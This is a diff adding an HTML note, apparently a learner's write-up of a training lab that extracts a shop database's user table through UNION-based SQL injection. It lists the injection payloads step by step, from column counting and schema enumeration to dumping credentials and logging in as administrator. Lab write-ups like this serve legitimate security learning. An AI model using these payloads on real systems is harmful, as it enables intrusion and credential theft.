@@ -1,0 +1,12 @@
+<!doctype html>
+<html>
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <title>SQL injection attack, listing the database contents on non-Oracle databases</title>
+  <meta name="generator" content="CherryTree">
+  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
+</head>
+<body>
+<div class='page'><h1 class='title'>SQL injection attack, listing the database contents on non-Oracle databases</h1><br/><p><ol><li>Provided with storefront website, told to discover table containing usernames and passwords, told to log in as administrator</li><li>Launched burpsuite, interecepted request selecting random category, and sent to Repeater</li><li>Appended &#39;UNION SELECT NULL, NULL-- to target url</li><li>Discovered there are 2 columns</li><li>Appended ‘UNION SELECT ’a&#39;, ‘a’-- to check for string returns</li><li>Both columns allowed strings</li><li>Appended &#39;UNION SELECT table_name, NULL FROM information_shema.tables--</li><li>Located users_ghnmsd table in results</li><li>Appended ‘UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name=’users_ghnmsd&#39;--</li><li>Discovered columns email, password_jhgyme, username_akisvn</li><li>Appended &#39;UNION SELECT username_akisvn, password_jhgyme FROM users_ghnmsd--</li><li>Discovered admin credentials “administrator:91n4c1h6u699sa5d27v7”: </li></ol><img src="images/302-1.png" alt="images/302-1.png" /><ol><li>Navigated to /login</li><li>Logged in with credentials and completed lab successfully: </li></ol><img src="images/302-2.png" alt="images/302-2.png" /></p></div>
+</body>
+</html>
